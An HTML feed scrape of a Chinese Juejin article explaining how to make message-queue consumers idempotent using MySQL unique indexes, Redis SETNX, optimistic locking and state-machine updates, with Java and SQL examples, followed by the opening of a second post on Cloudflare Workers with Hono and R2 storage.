                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b90f78ff8e274bf4be3fd8ed68b53314~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55CG5oCn55qE5rK4576K576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984902&amp;x-signature=RlVMddGZIvqznbxqFQ2c%2FpyHVJA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">1. 引言：打破幻觉</h2>
<p>在分布式系统的世界里，我们首先要接受一个残酷的现实：<strong>任何主流的消息中间件（RabbitMQ, Kafka, RocketMQ），都无法保证“Exactly Once”（恰好一次）的投递语义。</strong></p>
<p>它们承诺的是 <strong>“At Least Once”（至少一次）</strong> 。为了保证消息绝不丢失（No Loss），MQ 会在网络抖动、Consumer 响应超时、甚至服务重启时，选择“宁可错杀一千（重复投递），不可放过一个（丢失消息）”。</p>
<p><strong>所以，重复消费不是 Bug，而是分布式系统为了高可靠性必须付出的代价。</strong></p>
<p>如果不处理幂等，后果是灾难性的：</p>
<ul>
<li>用户点了一次下单，系统生成了两笔订单。</li>
<li>用户支付了一次，账户余额被扣了两次。</li>
<li>库存明明只发了一次货，系统扣减了两次库存。</li>
</ul>
<p>今天，我们不谈那些虚无缥缈的理论，我将带你从 <strong>“数据操作类型”</strong> 这个独特的视角，将幂等性问题拆解为 <strong>Insert（新增）</strong> 和 <strong>Update（修改）</strong> 两个战场，逐个击破。</p>
<hr/>
<h2 data-id="heading-1">2. 核心战略：分而治之</h2>
<p>很多开发者的误区在于：试图用一个通用的 <code>Redis setnx</code> 或者是“去重表”解决所有问题。</p>
<p><strong>这是错误的。</strong></p>
<ul>
<li><strong>新增类业务（Insert）</strong> ：关注的是 <strong>“存在性”</strong> 。只要这个 ID 存在了，就坚决不能再生成第二条。</li>
<li><strong>修改类业务（Update）</strong> ：关注的是 <strong>“状态流转”</strong> 或 <strong>“版本控制”</strong> 。允许你执行 SQL，但前提是条件必须满足。</li>
</ul>
<p>针对这两类场景，我们的防御工事完全不同。</p>
<hr/>
<h2 data-id="heading-2">3. 场景一：新增类业务 (Insert) —— 守住底线</h2>
<p><strong>典型场景</strong>：用户注册（不能有两个同名用户）、创建订单（MQ 收到下单消息，不能插入两条订单记录）。 <strong>核心目标</strong>：数据库里绝对不能出现两条一样的记录。</p>
<h3 data-id="heading-3">方案 A（黄金标准）：数据库唯一索引 (Unique Index)</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f04805cdca14ab393037c39bec11216~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55CG5oCn55qE5rK4576K576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984902&amp;x-signature=uGkGqDmpMLF4jd4gb6OhL%2BAox%2B0%3D" alt="image.png" loading="lazy"/></p>
<p>这是最底层、最硬核、也是最可靠的方案。不管你的代码写得多么花哨，Redis 挂没挂，数据库的唯一索引是最后的防线。</p>
<p><strong>1. 数据库层面 (MySQL DDL)</strong></p>
<p>你需要确保你的业务表中，有一个字段是“全局唯一”的（通常是业务主键，如 <code>order_no</code>，注意不是自增 <code>id</code>）。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `t_order` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `order_no` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'业务订单号，幂等核心'</span>,
  `user_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `amount` <span class="hljs-type">decimal</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `create_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),
  <span class="hljs-comment">-- 关键点：建立唯一索引</span>
  <span class="hljs-keyword">UNIQUE</span> KEY `uk_order_no` (`order_no`)
) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'订单表'</span>;
</code></pre>
<p><strong>2. 代码层面 (Java + Spring Boot)</strong></p>
<p>在消费者（Consumer）代码中，我们利用 <code>try-catch</code> 捕获数据库抛出的唯一索引冲突异常。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.dao.DuplicateKeyException;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;
​
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderConsumerService</span> {
​
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
​
    <span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderMessageDTO message)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">entity</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        entity.setOrderNo(message.getOrderNo()); <span class="hljs-comment">// 这里的 OrderNo 来自上游，且唯一</span>
        entity.setUserId(message.getUserId());
        entity.setAmount(message.getAmount());
​
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 尝试插入</span>
            orderMapper.insert(entity);
            System.out.println(<span class="hljs-string">"订单创建成功: "</span> + message.getOrderNo());
        } <span class="hljs-keyword">catch</span> (DuplicateKeyException e) {
            <span class="hljs-comment">// 捕获唯一索引冲突异常</span>
            <span class="hljs-comment">// 这说明是重复消息，直接吞掉异常，视为消费成功</span>
            System.out.println(<span class="hljs-string">"检测到重复订单消息，自动忽略: "</span> + message.getOrderNo());
        }
    }
}
</code></pre>
<h3 data-id="heading-4">方案 B（高性能）：Redis 防重 (SetNX)</h3>
<p>如果你的系统是秒杀级别，或者数据库压力已经很大，不想让每一次重复请求都去撞数据库（撞库会产生数据库行锁，影响性能），那么可以在 DB 之前加一层 Redis 过滤。</p>
<p><strong>核心代码 (StringRedisTemplate)</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> java.time.Duration;
​
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisIdempotentToken</span> {
​
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;
​
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">lock</span><span class="hljs-params">(String bizId)</span> {
        <span class="hljs-comment">// key = 业务前缀 + 业务ID</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"idempotent:order:"</span> + bizId;
        
        <span class="hljs-comment">// setIfAbsent 等同于 SETNX</span>
        <span class="hljs-comment">// 关键点：必须设置过期时间！防止服务挂掉后 Key 永久存在，导致该订单永远无法处理</span>
        <span class="hljs-type">Boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue()
                .setIfAbsent(key, <span class="hljs-string">"1"</span>, Duration.ofMinutes(<span class="hljs-number">10</span>));
        
        <span class="hljs-keyword">return</span> Boolean.TRUE.equals(success);
    }
}
​
<span class="hljs-comment">// 消费者伪代码</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleMessage</span><span class="hljs-params">(OrderMessageDTO msg)</span> {
    <span class="hljs-comment">// 1. 先过 Redis 这一关</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> redisIdempotentToken.lock(msg.getOrderNo());
    <span class="hljs-keyword">if</span> (!lock) {
        log.info(<span class="hljs-string">"重复消息被 Redis 拦截: {}"</span>, msg.getOrderNo());
        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 直接 ACK</span>
    }
    
    <span class="hljs-comment">// 2. 再执行数据库操作（数据库最好依然保留唯一索引兜底）</span>
    <span class="hljs-keyword">try</span> {
        orderService.createOrder(msg);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-comment">// 如果业务失败，理论上应该删除 Redis key 允许重试</span>
        <span class="hljs-comment">// 但如果这里挂了，Key 会在 10 分钟后自动过期，实现最终一致性</span>
        <span class="hljs-keyword">throw</span> e;
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-5">4. 场景二：修改类业务 (Update) —— 巧妙利用数据状态</h2>
<p><strong>典型场景</strong>：订单支付成功后，将状态从 <code>UNPAID</code> 改为 <code>PAID</code>；或者扣减库存。 <strong>核心目标</strong>：防止 ABA 问题，或防止重复扣减。</p>
<h3 data-id="heading-6">方案 A（最推荐）：多版本控制/乐观锁 (Optimistic Locking)</h3>
<p>对于库存扣减、余额变更这类涉及“计算”的更新，<strong>乐观锁</strong>是最佳实践。我们给表加一个 <code>version</code> 字段。</p>
<p><strong>1. SQL 原理</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 假设当前库存是 100，版本号是 5</span>
<span class="hljs-comment">-- 只有当版本号还是 5 的时候，才执行扣减，同时版本号 +1</span>
<span class="hljs-keyword">UPDATE</span> t_product_stock 
<span class="hljs-keyword">SET</span> stock <span class="hljs-operator">=</span> stock <span class="hljs-operator">-</span> <span class="hljs-number">1</span>, version <span class="hljs-operator">=</span> version <span class="hljs-operator">+</span> <span class="hljs-number">1</span> 
<span class="hljs-keyword">WHERE</span> product_id <span class="hljs-operator">=</span> <span class="hljs-number">1001</span> <span class="hljs-keyword">AND</span> version <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;
</code></pre>
<p><strong>2. Java DAO 层代码 (MyBatis)</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StockMapper</span> {
​
    <span class="hljs-comment">/**
     * 乐观锁扣减库存
     * <span class="hljs-doctag">@return</span> 影响行数。1 表示成功，0 表示版本不匹配（已被别人修改或重复请求）
     */</span>
    <span class="hljs-meta">@Update("UPDATE t_product_stock SET stock = stock - #{count}, version = version + 1 " +
            "WHERE product_id = #{productId} AND version = #{oldVersion}")</span>
    <span class="hljs-type">int</span> <span class="hljs-title function_">deductStock</span><span class="hljs-params">(<span class="hljs-meta">@Param("productId")</span> Long productId, 
                    <span class="hljs-meta">@Param("count")</span> Integer count, 
                    <span class="hljs-meta">@Param("oldVersion")</span> Integer oldVersion)</span>;
}
</code></pre>
<p><strong>消费者逻辑：</strong> 消费者先查出当前数据的 version，然后尝试更新。如果返回 <code>0</code>，说明数据变了，此时通常需要重新查询再重试（CAS 自旋），或者根据业务逻辑直接判断为“已处理”。</p>
<h3 data-id="heading-7">方案 B（业务逻辑锁）：状态机 (State Machine)</h3>
<p>对于订单状态流转，我们不需要额外的 <code>version</code> 字段，<strong>状态本身就是锁</strong>。</p>
<p><strong>1. SQL 原理</strong></p>
<p>业务规则：订单只能从 <code>UNPAID</code> (待支付) 变为 <code>PAID</code> (已支付)。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">UPDATE</span> t_order 
<span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'PAID'</span>, update_time <span class="hljs-operator">=</span> NOW()
<span class="hljs-keyword">WHERE</span> order_no <span class="hljs-operator">=</span> <span class="hljs-string">'ORDER_20240101'</span> <span class="hljs-keyword">AND</span> status <span class="hljs-operator">=</span> <span class="hljs-string">'UNPAID'</span>;
</code></pre>
<p><strong>2. Java 代码</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payOrder</span><span class="hljs-params">(String orderNo)</span> {
    <span class="hljs-comment">// 利用 update 的原子性和 where 条件</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">rows</span> <span class="hljs-operator">=</span> orderMapper.updateStatus(orderNo, <span class="hljs-string">"PAID"</span>, <span class="hljs-string">"UNPAID"</span>);
    
    <span class="hljs-keyword">if</span> (rows == <span class="hljs-number">1</span>) {
        System.out.println(<span class="hljs-string">"订单支付成功，状态更新完成"</span>);
        <span class="hljs-comment">// 后续发货逻辑...</span>
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// rows == 0，意味着：</span>
        <span class="hljs-comment">// 1. 订单不存在（极少）</span>
        <span class="hljs-comment">// 2. 订单状态已经不是 UNPAID 了（可能是 PAID，也可能是 CLOSED）</span>
        <span class="hljs-comment">// 结论：消息是重复的，或者乱序的，直接忽略，视为幂等成功</span>
        System.out.println(<span class="hljs-string">"订单状态不符合或已处理，忽略消息: "</span> + orderNo);
    }
}
</code></pre>
<p>这种方案极其简洁，不需要引入复杂的分布式锁，利用数据库行锁天然解决并发和幂等。</p>
<hr/>
<h2 data-id="heading-8">5. 避坑指南与总结</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7125e9dd6eec415b8643efc20eb81219~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55CG5oCn55qE5rK4576K576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984902&amp;x-signature=dmt5xteEAx2hYoEsxdMFPR2UpY8%3D" alt="image.png" loading="lazy"/>
在文章的最后，我要提醒大家一个在“Redis + 数据库”混合双打时最容易踩的坑。</p>
<h3 data-id="heading-9">⚠️ 致命坑：Redis 原子性陷阱</h3>
<p><strong>错误流程：</strong></p>
<ol start="0">
<li>消费者收到消息。</li>
<li><code>Redis.setnx</code> 成功。</li>
<li>开始执行 DB 事务。</li>
<li><strong>DB 事务报错/超时/回滚</strong>。</li>
<li>消费者结束，Redis 里的 Key 依然存在。</li>
</ol>
<p><strong>后果：</strong> MQ 会重试这条消息。但第二次进来时，Redis 判断 Key 已存在，认为是重复请求，直接拦截返回成功。 <strong>最终结果：</strong> 数据库里没数据，消息却被丢弃了！<strong>数据丢失！</strong></p>
<p><strong>解决方案：</strong></p>
<ol start="0">
<li><strong>数据库兜底</strong>：Redis 只是为了挡住 99% 的流量，数据库必须依然有唯一索引。</li>
<li><strong>异常删除</strong>：在 catch 代码块中，务必显式删除 Redis Key。</li>
<li><strong>短 TTL</strong>：给 Redis Key 设置合理的过期时间（如 10 分钟），作为最后的容错手段。</li>
</ol>
<h3 data-id="heading-10">📝 终极对比表</h3>








































<table><thead><tr><th>维度</th><th>新增场景 (Insert)</th><th>修改场景 (Update)</th></tr></thead><tbody><tr><td><strong>典型业务</strong></td><td>创建订单、注册用户、新增流水</td><td>扣减库存、更新订单状态、修改余额</td></tr><tr><td><strong>推荐方案</strong></td><td><strong>数据库唯一索引 (Unique Index)</strong></td><td><strong>状态机 (Where Status) / 乐观锁</strong></td></tr><tr><td><strong>备选方案</strong></td><td>Redis SetNX (用于超高并发前置拦截)</td><td>去重表 (适用于跨多表复杂逻辑)</td></tr><tr><td><strong>核心逻辑</strong></td><td>靠“键冲突”来保证</td><td>靠“条件不满足”来保证</td></tr><tr><td><strong>优点</strong></td><td>强一致性，代码简单，不易出错</td><td>性能好，无额外存储开销</td></tr><tr><td><strong>缺点</strong></td><td>数据库写压力大时需配合 Redis</td><td>需要业务有明确的状态流转或版本号</td></tr></tbody></table>
<p>希望这篇文章能帮你彻底厘清 MQ 幂等性的实现思路。记住：<strong>越复杂的代码越容易出 Bug，能利用数据库天然特性解决的，就不要引入外部依赖。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[cloudflare+hono使用worker实现api接口和r2文件存储和下载]]></title>    <link>https://juejin.cn/post/7595028805157912586</link>    <guid>https://juejin.cn/post/7595028805157912586</guid>    <pubDate>2026-01-14T08:37:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595028805157912586" data-draft-id="7595041883144110126" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="cloudflare+hono使用worker实现api接口和r2文件存储和下载"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T08:37:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024小神"/> <meta itemprop="url" content="https://juejin.cn/user/70007368988926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            cloudflare+hono使用worker实现api接口和r2文件存储和下载
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/70007368988926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024小神
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:37:12.000Z" title="Wed Jan 14 2026 08:37:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我的开源项目PakePlus可以将网页/Vue/React项目打包为桌面/手机应用并且小于5M只需几分钟，官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpakeplus.com" target="_blank" title="https://pakeplus.com" ref="nofollow noopener noreferrer">pakeplus.com</a></p><p><img alt="" src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/addad47db1a14723b55e1a6e057295a2~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" width="2524" loading="lazy"/></p><p/>
<p>步骤也很简单，就是使用命令创建一个hono创建一个基础框架，然后绑定r2对象存储，然后写上传和下载的接口，然后测试发布即可。</p>
<p>使用命令：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm create cloudflare@latest upload-r2</code></pre>
<p>然后创建后打开，绑定r2:</p>
<p>bucket_name 这里添加你的存储桶名称即可，没有的话，在后台页面创建一个存储桶或者使用命令行创建一个。</p>
